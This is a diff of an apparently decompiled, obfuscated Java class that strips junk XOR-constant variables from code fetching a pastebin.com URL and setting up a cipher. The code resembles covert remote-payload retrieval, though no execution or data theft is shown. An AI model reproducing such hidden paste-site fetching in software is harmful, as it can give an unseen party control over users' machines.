@@ -34,22 +34,12 @@ public class fwi {
       int[] ax = dar.abu();
 
       try {
-         short var10002 = 17375;
-         long var10003 = 5427321886245673678L ^ a;
          URL axx = new URL("https://pastebin.com/gtCdWxDx");
          HttpURLConnection axxx = (HttpURLConnection)axx.openConnection();
-         short var10001 = 25685;
-         long var13 = 6917806885029150021L ^ a;
          axxx.setRequestMethod("GET");
-         var10001 = 15684;
-         long var14 = 6446438649518278958L ^ a;
          axxx.setConnectTimeout(3000);
-         var10001 = 11339;
-         long var15 = 7964040698463180835L ^ a;
          axxx.setReadTimeout(3000);
          int axxxx = axxx.getResponseCode();
-         var10001 = 21772;
-         long var16 = 3221773921841848679L ^ a;
          if (axxxx != 200) {
             return null;
          } else {
@@ -132,8 +122,6 @@ public class fwi {
          if ((var15 += var16) >= var19) {
             b = var20;
             c = new String[3];
-            short var23 = 1036;
-            long var26 = 5377251845478593336L ^ var11;
             bib = "https://pastebin.com/gtCdWxDx";
             g = new HashMap(13);
             Cipher var0;
@@ -185,7 +173,6 @@ public class fwi {
                   | (var10[5] & 255L) << 16
                   | (var10[6] & 255L) << 8
                   | var10[7] & 255L;
-               byte var33 = -1;
                var6[var10001] = var10004;
             } while (var2 < var5);
 
